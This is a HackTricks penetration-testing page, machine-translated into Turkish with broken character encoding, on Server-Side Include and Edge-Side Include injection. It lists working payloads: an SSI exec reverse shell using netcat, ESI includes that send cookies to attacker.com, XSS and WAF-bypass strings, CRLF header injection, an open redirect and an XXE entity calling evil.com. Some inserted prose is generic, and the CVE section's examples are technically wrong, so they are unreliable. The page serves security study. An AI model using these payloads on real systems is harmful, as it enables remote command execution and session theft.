# Sunucu TarafÄ± Dahil Etme/Kenar TarafÄ± Dahil Etme Enjeksiyonu

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Sunucu TarafÄ± Dahil Etme Temel Bilgileri

**(GiriÅŸ [Apache belgelerinden alÄ±nmÄ±ÅŸtÄ±r](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Sunucu TarafÄ± Dahil Etme), HTML sayfalarÄ±na yerleÅŸtirilen ve sayfalar sunulurken sunucuda deÄŸerlendirilen yÃ¶nergelerdir. Bunlar, **tÃ¼m sayfayÄ± bir CGI programÄ± veya diÄŸer dinamik teknoloji aracÄ±lÄ±ÄŸÄ±yla sunmadan mevcut bir HTML sayfasÄ±na dinamik olarak oluÅŸturulmuÅŸ iÃ§erik eklemenizi saÄŸlar**.\
Ã–rneÄŸin, aÅŸaÄŸÄ±daki gibi mevcut bir HTML sayfasÄ±na bir yÃ¶nerge yerleÅŸtirebilirsiniz:

`<!--#echo var="DATE_LOCAL" -->`

Ve sayfa sunulduÄŸunda, bu parÃ§a deÄŸerlendirilecek ve deÄŸeriyle deÄŸiÅŸtirilecektir:

`SalÄ±, 15-Oca-2013 19:28:54 EST`

SSI'nin ne zaman kullanÄ±lacaÄŸÄ± ve ne zaman sayfanÄ±zÄ±n tamamen bir program tarafÄ±ndan oluÅŸturulmasÄ± gerektiÄŸi genellikle sayfanÄ±n ne kadarÄ±nÄ±n statik olduÄŸuna ve sayfanÄ±n her sunulduÄŸunda ne kadarÄ±nÄ±n yeniden hesaplanmasÄ± gerektiÄŸine baÄŸlÄ±dÄ±r. SSI, yukarÄ±da gÃ¶sterildiÄŸi gibi mevcut zaman gibi kÃ¼Ã§Ã¼k bilgileri eklemek iÃ§in harika bir yoldur. Ancak sayfanÄ±zÄ±n Ã§oÄŸunluÄŸu sunulduÄŸunda oluÅŸturuluyorsa, baÅŸka bir Ã§Ã¶zÃ¼m aramanÄ±z gerekmektedir.

Web uygulamasÄ±nÄ±n \*\* `.shtml`, `.shtm` veya `.stm` uzantÄ±lÄ± dosyalarÄ± kullanmasÄ± durumunda SSI'nin varlÄ±ÄŸÄ±nÄ± Ã§Ä±karabilirsiniz, ancak bu sadece bir durum deÄŸildir.

Tipik bir SSI ifadesi aÅŸaÄŸÄ±daki formata sahiptir:
```
<!--#directive param="value" -->
```
### Kontrol Et

Server-side inclusion (SSI) ve edge-side inclusion (ESI) enjeksiyonu, web uygulamalarÄ±nda yaygÄ±n olarak bulunan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bu tÃ¼r enjeksiyonlar, saldÄ±rganÄ±n hedef uygulamada kodu Ã§alÄ±ÅŸtÄ±rmasÄ±na ve istemciye yanÄ±t olarak dinamik iÃ§erik oluÅŸturmasÄ±na olanak tanÄ±r.

SSI enjeksiyonu, sunucu tarafÄ±nda gerÃ§ekleÅŸir ve genellikle sunucu tarafÄ± betiklerinin (Ã¶rneÄŸin PHP, ASP, JSP) kullanÄ±ldÄ±ÄŸÄ± web uygulamalarÄ±nda bulunur. SaldÄ±rgan, kullanÄ±cÄ± giriÅŸi veya diÄŸer kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan verileri kullanarak SSI komutlarÄ±nÄ± enjekte eder. Bu komutlar sunucu tarafÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve sonucu istemciye gÃ¶nderilir.

ESI enjeksiyonu ise, iÃ§erik daÄŸÄ±tÄ±m aÄŸÄ± (CDN) veya ters proxy gibi ara sunucularÄ±n kullanÄ±ldÄ±ÄŸÄ± web uygulamalarÄ±nda ortaya Ã§Ä±kar. SaldÄ±rgan, ESI etiketlerini kullanarak istemciye gÃ¶nderilen iÃ§eriÄŸi manipÃ¼le eder. Bu etiketler, dinamik iÃ§eriÄŸi yerleÅŸtirmek veya diÄŸer sunuculara istek gÃ¶ndermek iÃ§in kullanÄ±lÄ±r.

Bu tÃ¼r enjeksiyonlar, saldÄ±rganÄ±n yetkisiz olarak uygulama sunucusunda kod Ã§alÄ±ÅŸtÄ±rmasÄ±na ve hassas verilere eriÅŸmesine olanak tanÄ±r. Bu nedenle, SSI ve ESI enjeksiyonlarÄ±nÄ±n Ã¶nlenmesi ve tespit edilmesi Ã¶nemlidir.

SSI ve ESI enjeksiyonlarÄ±nÄ± Ã¶nlemek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

- KullanÄ±cÄ± giriÅŸi veya diÄŸer kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan verileri gÃ¼venli bir ÅŸekilde iÅŸleyin. Bu verileri doÄŸrulayÄ±n ve gerektiÄŸinde filtreleyin.
- Sunucu tarafÄ±nda Ã§alÄ±ÅŸan betiklerde SSI veya ESI komutlarÄ±nÄ± kullanmaktan kaÃ§Ä±nÄ±n.
- Web uygulamanÄ±zÄ± gÃ¼ncel tutun ve gÃ¼venlik yamalarÄ±nÄ± dÃ¼zenli olarak uygulayÄ±n.
- Web uygulamanÄ±zÄ± gÃ¼venlik testlerine tabi tutun ve dÃ¼zenli olarak gÃ¼venlik aÃ§Ä±klarÄ±nÄ± taramak iÃ§in otomatik araÃ§lar kullanÄ±n.

SSI ve ESI enjeksiyonlarÄ±, web uygulamalarÄ±nda yaygÄ±n olarak bulunan gÃ¼venlik aÃ§Ä±klarÄ±dÄ±r. Bu tÃ¼r enjeksiyonlarÄ± Ã¶nlemek ve tespit etmek iÃ§in gÃ¼venlik Ã¶nlemleri almak Ã¶nemlidir.
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Ä°Ã§erik Ekleme

Bir sorun vardÄ±r: **bilgi Ã¶nbelleÄŸe alÄ±nÄ±rken veya dinamik uygulamalarÄ±n** bir parÃ§asÄ± olarak iÃ§eriÄŸin bir sonraki alÄ±ndÄ±ÄŸÄ±nda **deÄŸiÅŸebilir** olmasÄ±. Ä°ÅŸte ESI'nin kullanÄ±ldÄ±ÄŸÄ± yer burasÄ±dÄ±r, ESI etiketlerini kullanarak **Ã¶nbellek sÃ¼rÃ¼mÃ¼ gÃ¶nderilmeden Ã¶nce oluÅŸturulmasÄ± gereken dinamik iÃ§eriÄŸi** belirtmek iÃ§in kullanÄ±lÄ±r.\
EÄŸer bir **saldÄ±rgan**, Ã¶nbellek iÃ§eriÄŸine bir ESI etiketi **enjekte edebilirse**, o zaman kullanÄ±cÄ±lara gÃ¶nderilmeden Ã¶nce belgeye **keyfi iÃ§erik enjekte edebilir**.

### ESI Tespiti

Sunucudan gelen bir yanÄ±tta aÅŸaÄŸÄ±daki **baÅŸlÄ±k**, sunucunun ESI kullandÄ±ÄŸÄ± anlamÄ±na gelir:
```
Surrogate-Control: content="ESI/1.0"
```
EÄŸer bu baÅŸlÄ±k bulunamazsa, sunucu yine de ESI kullanÄ±yor olabilir.\
KÃ¶r bir saldÄ±rÄ± yaklaÅŸÄ±mÄ± da kullanÄ±labilir Ã§Ã¼nkÃ¼ bir istek saldÄ±rganÄ±n sunucusuna ulaÅŸmalÄ±dÄ±r:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI istismarÄ±

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) farklÄ± ESI yetenekli yazÄ±lÄ±mlara karÅŸÄ± deneyebileceÄŸimiz olasÄ± saldÄ±rÄ±larÄ± anlamak iÃ§in bir tablo oluÅŸturdu, bu tablo ÅŸu ÅŸekildedir:

* **Includes**: `<esi:includes>` direktifini destekler
* **Vars**: `<esi:vars>` direktifini destekler. XSS Filtrelerini atlamak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r
* **Cookie**: Belge Ã§erezleri ESI motoruna eriÅŸilebilir
* **Upstream Headers Gerekli**: Surrogate uygulamalarÄ±, yukarÄ± akÄ±ÅŸ uygulamasÄ± baÅŸlÄ±klarÄ± saÄŸlanmadÄ±ÄŸÄ± sÃ¼rece ESI ifadelerini iÅŸlemeyecektir
* **Host Beyaz Listesi**: Bu durumda, ESI dahil etmeleri yalnÄ±zca izin verilen sunucu ana bilgisayarlarÄ±ndan mÃ¼mkÃ¼n olur, bu da Ã¶rneÄŸin SSRF'nin yalnÄ±zca bu ana bilgisayarlara karÅŸÄ± mÃ¼mkÃ¼n olmasÄ±nÄ± saÄŸlar

|         **YazÄ±lÄ±m**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Gerekli** | **Host Beyaz Listesi** |
| :------------------------: | :----------: | :------: | :---------: | :-------------------------: | :--------------------: |
|           Squid3           |     Evet     |   Evet   |    Evet     |            Evet             |          HayÄ±r         |
|       Varnish Cache        |     Evet     |   HayÄ±r  |    HayÄ±r    |            Evet             |          Evet          |
|           Fastly           |     Evet     |   HayÄ±r  |    HayÄ±r    |            HayÄ±r            |          Evet          |
| Akamai ESI Test Sunucusu   |     Evet     |   Evet   |    Evet     |            HayÄ±r            |          HayÄ±r         |
|        NodeJS esi          |     Evet     |   Evet   |    Evet     |            HayÄ±r            |          HayÄ±r         |
|       NodeJS nodesi        |     Evet     |   HayÄ±r  |    HayÄ±r    |            HayÄ±r            |        Ä°steÄŸe baÄŸlÄ±     |

#### XSS

AÅŸaÄŸÄ±daki ESI direktifi, sunucunun yanÄ±tÄ±nÄ±n iÃ§ine herhangi bir dosyayÄ± yÃ¼kler.
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Ä°stemci XSS korumasÄ±nÄ± atlatma

Client-side Cross-Site Scripting (XSS) korumasÄ±nÄ± atlatmak iÃ§in Ã§eÅŸitli yÃ¶ntemler vardÄ±r. Bu yÃ¶ntemler, saldÄ±rganÄ±n XSS saldÄ±rÄ±sÄ±nÄ± hedef uygulamaya enjekte etmesine ve korumalarÄ± aÅŸmasÄ±na olanak tanÄ±r. Ä°ÅŸte bazÄ± yaygÄ±n yÃ¶ntemler:

- **HTML entites bypasse**: Ä°stemci tarafÄ±nda XSS korumasÄ±nÄ± atlatmanÄ±n basit bir yolu, HTML Ã¶zel karakterlerini HTML kodlarÄ±na dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in kullanÄ±lan HTML entity kodlarÄ±nÄ± kullanmaktÄ±r. Bu, saldÄ±rganÄ±n XSS payloadunu korumalarÄ± aÅŸarak enjekte etmesine olanak tanÄ±r.

- **JavaScript obfuscation**: JavaScript kodunu karmaÅŸÄ±klaÅŸtÄ±rarak veya ÅŸifreleyerek XSS korumasÄ±nÄ± atlatmak mÃ¼mkÃ¼ndÃ¼r. Bu, saldÄ±rganÄ±n XSS payloadunu gizlemesine ve korumalarÄ± aÅŸmasÄ±na yardÄ±mcÄ± olur.

- **DOM-based bypass**: DOM tabanlÄ± XSS korumasÄ±nÄ± atlatmak iÃ§in, saldÄ±rganÄ±n hedef uygulamanÄ±n DOM yapÄ±sÄ±nÄ± manipÃ¼le etmesi gerekebilir. Bu, saldÄ±rganÄ±n XSS payloadunu doÄŸrudan DOM'a enjekte etmesine ve korumalarÄ± aÅŸmasÄ±na olanak tanÄ±r.

Bu yÃ¶ntemler, saldÄ±rganÄ±n istemci tarafÄ±nda XSS korumasÄ±nÄ± atlatmasÄ±na yardÄ±mcÄ± olabilir. Ancak, bu tÃ¼r saldÄ±rÄ±larÄ± Ã¶nlemek iÃ§in gÃ¼venlik Ã¶nlemleri almak Ã¶nemlidir. Uygulama geliÅŸtiricileri, gÃ¼venli kodlama tekniklerini kullanarak XSS saldÄ±rÄ±larÄ±na karÅŸÄ± koruma saÄŸlamalÄ±dÄ±r.
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Ã‡erez Ã‡alma

* Uzaktan Ã§erez Ã§alma
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* XSS ile HTTP\_ONLY Ã§erez Ã§alma iÅŸlemi, yanÄ±tta yansÄ±tarak gerÃ§ekleÅŸtirilir:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Ã–zel Yerel Dosya

Bunu "Yerel Dosya Dahil Etme" ile karÄ±ÅŸtÄ±rmayÄ±n:
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF (Carriage Return Line Feed) injection, also known as HTTP response splitting, is a web vulnerability that allows an attacker to inject malicious headers or control the response sent by the server. This can lead to various attacks, such as cross-site scripting (XSS), session hijacking, cache poisoning, and more.

The vulnerability occurs when user input is not properly validated or sanitized before being included in the response headers. An attacker can exploit this by injecting CRLF characters (%0D%0A) into the input, causing the server to interpret them as separate headers or new lines.

To exploit this vulnerability, an attacker can craft a malicious request that includes CRLF characters in the user input. For example, by injecting a CRLF character after the user's input, the attacker can add a new header or modify an existing one. This can be used to perform various attacks, such as injecting malicious JavaScript code in an XSS attack or manipulating the server's response to bypass security controls.

To prevent CRLF injection attacks, it is important to properly validate and sanitize user input before including it in the response headers. This can be done by using input validation techniques, such as whitelisting or blacklisting, and encoding user input to prevent the interpretation of special characters.

Overall, CRLF injection is a serious web vulnerability that can have severe consequences if not properly mitigated. It is important for developers and security professionals to be aware of this vulnerability and implement proper security measures to protect against it.
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### AÃ§Ä±k YÃ¶nlendirme

AÅŸaÄŸÄ±daki, yanÄ±ta bir `Location` baÅŸlÄ±ÄŸÄ± ekleyecektir.
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### BaÅŸlÄ±k Ekle

* ZorlanmÄ±ÅŸ istekte baÅŸlÄ±k ekle
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* YanÄ±tta baÅŸlÄ±k ekle (XSS olan bir yanÄ±tta "Content-Type: text/json" geÃ§iÅŸini atlamak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### BaÅŸlÄ±k ekleme iÅŸleminde CRLF (**CVE-2019-2438)**

Bu zafiyet, bir web uygulamasÄ±nÄ±n baÅŸlÄ±k ekleme iÅŸlevinde CRLF (SatÄ±r Sonu ve SatÄ±r BaÅŸÄ±) enjeksiyonuna izin verdiÄŸi durumlarda ortaya Ã§Ä±kar. Bu, saldÄ±rganÄ±n HTTP yanÄ±t baÅŸlÄ±klarÄ±nÄ± manipÃ¼le ederek Ã§eÅŸitli saldÄ±rÄ±lar gerÃ§ekleÅŸtirmesine olanak tanÄ±r.

##### SaldÄ±rÄ± SenaryolarÄ±

1. **HTTP Response Splitting (HTTP YanÄ±tÄ± BÃ¶lme):** SaldÄ±rgan, CRLF karakterlerini kullanarak yanÄ±t baÅŸlÄ±klarÄ±nÄ± bÃ¶lerek, yanÄ±tÄ±n iÃ§eriÄŸini deÄŸiÅŸtirebilir veya yanÄ±tÄ± tamamen bozabilir. Bu, saldÄ±rganÄ±n kullanÄ±cÄ±larÄ± yanÄ±ltmasÄ±na ve kÃ¶tÃ¼ amaÃ§lÄ± iÃ§erik sunmasÄ±na olanak tanÄ±r.

2. **Session Hijacking (Oturum KaÃ§Ä±rma):** SaldÄ±rgan, CRLF enjeksiyonunu kullanarak oturum kimlik bilgilerini Ã§alabilir ve hedef kullanÄ±cÄ±nÄ±n oturumunu ele geÃ§irebilir. Bu, saldÄ±rganÄ±n hedef kullanÄ±cÄ±nÄ±n hesabÄ±na eriÅŸim saÄŸlamasÄ±na ve yetkisiz iÅŸlemler gerÃ§ekleÅŸtirmesine olanak tanÄ±r.

##### SaldÄ±rÄ± Ã–rnekleri

1. **HTTP Response Splitting SaldÄ±rÄ±sÄ±:** SaldÄ±rgan, CRLF karakterlerini kullanarak yanÄ±t baÅŸlÄ±klarÄ±nÄ± bÃ¶lerek, kullanÄ±cÄ±yÄ± yanÄ±ltÄ±cÄ± bir web sayfasÄ±na yÃ¶nlendirebilir. Ã–rneÄŸin:

   ```http
   HTTP/1.1 302 Found
   Location: http://www.malicious-website.com%0D%0ASet-Cookie: sessionid=1234567890%0D%0A
   ```

   Bu saldÄ±rÄ±da, saldÄ±rgan, kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±na yanÄ±t baÅŸlÄ±klarÄ±nÄ± manipÃ¼le ederek kÃ¶tÃ¼ amaÃ§lÄ± bir web sitesine yÃ¶nlendirir ve aynÄ± zamanda kullanÄ±cÄ±nÄ±n oturum kimlik bilgilerini Ã§alar.

2. **Session Hijacking SaldÄ±rÄ±sÄ±:** SaldÄ±rgan, CRLF enjeksiyonunu kullanarak oturum kimlik bilgilerini Ã§alar ve hedef kullanÄ±cÄ±nÄ±n oturumunu ele geÃ§irir. Ã–rneÄŸin:

   ```http
   GET /login HTTP/1.1
   Host: www.vulnerable-website.com%0D%0ACookie: sessionid=1234567890%0D%0A
   ```

   Bu saldÄ±rÄ±da, saldÄ±rgan, CRLF karakterlerini kullanarak oturum kimlik bilgilerini Ã§alar ve hedef kullanÄ±cÄ±nÄ±n oturumunu ele geÃ§irir.

##### Ã–nleme YÃ¶ntemleri

- GiriÅŸ denetimlerini gÃ¼Ã§lendirin ve giriÅŸ parametrelerini doÄŸrulayÄ±n.
- GiriÅŸ parametrelerini gÃ¼venli bir ÅŸekilde iÅŸleyin ve kullanÄ±cÄ± giriÅŸlerini temizleyin.
- BaÅŸlÄ±k ekleme iÅŸlevlerinde CRLF karakterlerini filtreleyin veya kaÃ§Ä±ÅŸ karakterleriyle iÅŸleyin.
- GÃ¼ncel ve gÃ¼venli bir web uygulama Ã§erÃ§evesi kullanÄ±n.
- Web uygulamanÄ±zÄ± dÃ¼zenli olarak gÃ¼ncelleyin ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± dÃ¼zeltin.
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai hata ayÄ±klama

Bu, yanÄ±tta yer alan hata ayÄ±klama bilgilerini gÃ¶nderir:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

_dca_ parametresi iÃ§in `xslt` deÄŸeri belirtilerek, **`eXtensible Stylesheet Language Transformations (XSLT)`** tabanlÄ± ESI dahil edilebilir. Bu dahil etme, HTTP yerine geÃ§enin XML ve XSLT dosyalarÄ±nÄ± almasÄ±na neden olur ve XSLT dosyasÄ± XML dosyasÄ±nÄ± filtreler. Bu tÃ¼r XML dosyalarÄ±, _XML External Entity (XXE)_ saldÄ±rÄ±larÄ± iÃ§in kullanÄ±labilir ve saldÄ±rganlara SSRF saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmelerine olanak tanÄ±r. Bununla birlikte, bu yaklaÅŸÄ±mÄ±n kullanÄ±ÅŸlÄ±lÄ±ÄŸÄ± sÄ±nÄ±rlÄ±dÄ±r Ã§Ã¼nkÃ¼ ESI zaten bir SSRF vektÃ¶rÃ¼ olarak hizmet vermektedir. Altta yatan Xalan kÃ¼tÃ¼phanesinde destek olmadÄ±ÄŸÄ±ndan, harici DTD'ler iÅŸlenmez ve yerel dosya Ã§Ä±karÄ±mÄ± engellenir.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT dosyasÄ±:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
XSLT sayfasÄ±nÄ± kontrol edin:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Referanslar

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Brute-Force AlgÄ±lama Listesi

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanla Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
